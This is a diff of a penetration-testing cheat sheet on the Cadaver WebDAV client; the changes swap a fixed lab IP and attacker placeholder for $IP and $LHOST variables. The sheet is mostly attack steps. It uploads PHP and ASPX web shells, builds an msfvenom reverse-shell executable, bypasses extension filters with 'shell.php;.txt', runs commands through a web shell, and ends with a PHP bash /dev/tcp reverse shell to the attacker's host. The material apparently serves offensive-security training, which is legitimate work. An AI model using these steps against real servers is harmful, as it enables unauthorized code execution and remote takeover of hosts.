@@ -1,20 +1,20 @@
 # Cadaver – WebDAV Client
 
 !!! tip "Tip"
-    `cadaver http://10.10.10.10/webdav/` opens an interactive FTP-like session. Use `put shell.php` to upload, `ls` to list. If the server is IIS, upload `.asp` or `.aspx` instead of `.php`.
+    `cadaver http://$IP/webdav/` opens an interactive FTP-like session. Use `put shell.php` to upload, `ls` to list. If the server is IIS, upload `.asp` or `.aspx` instead of `.php`.
 
 ---
 ## Connecting to a WebDAV Server
 
 ```bash
-cadaver http://10.10.10.10/path/
+cadaver http://$IP/path/
 ```
 
 If authentication is required, cadaver will prompt for username and password:
 
 ```bash
-cadaver http://10.10.10.10/
-Authentication required for webdav on server `10.10.10.10':
+cadaver http://$IP/
+Authentication required for webdav on server `$IP':
 Username: test
 Password: ****
 ```
@@ -22,13 +22,13 @@ Password: ****
 For HTTPS with a self-signed cert:
 
 ```bash
-cadaver https://10.10.10.10/
+cadaver https://$IP/
 ```
 
 To skip SSL verification:
 
 ```bash
-GIT_SSL_NO_VERIFY=1 cadaver https://10.10.10.10/
+GIT_SSL_NO_VERIFY=1 cadaver https://$IP/
 ```
 
 ---
@@ -64,13 +64,13 @@ put /usr/share/webshells/aspx/cmdasp.aspx
 Create a payload:
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > revshell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe > revshell.exe
 ```
 
 Navigate to the site to interact with `cmdasp.aspx`:
 
 ```bash
-http://10.10.10.10/cmdasp.aspx
+http://$IP/cmdasp.aspx
 ```
 
 Find where the shell is stored using the `cmdasp.aspx` command box:
@@ -102,7 +102,7 @@ Basic PHP reverse shell:
 Access in browser:
 
 ```
-http://10.10.10.10/shell.php?cmd=whoami
+http://$IP/shell.php?cmd=whoami
 ```
 
 ### Upload with Filename Bypass (if extensions blocked)
@@ -120,8 +120,8 @@ put shell.php;.txt
 1. **Identify WebDAV Support**
 
     ```bash
-    nmap -n -sV --script http-iis-webdav-vuln.nse 10.10.10.10
-    curl -X OPTIONS http://10.10.10.10/
+    nmap -n -sV --script http-iis-webdav-vuln.nse $IP
+    curl -X OPTIONS http://$IP/
     ```
 
     Look for `DAV: 1,2` in response headers.
@@ -129,7 +129,7 @@ put shell.php;.txt
 2. **Connect to the WebDAV Directory**
 
     ```bash
-    cadaver http://10.10.10.10/
+    cadaver http://$IP/
     ```
 
 3. **Check Write Permissions**
@@ -149,13 +149,13 @@ put shell.php;.txt
 5. **Execute Shell**
 
     ```bash
-    curl http://10.10.10.10/shell.php?cmd=id
+    curl http://$IP/shell.php?cmd=id
     ```
 
 6. **Establish Reverse Shell**
 
     ```php
-    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>
+    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'"); ?>
     ```
 
 ---
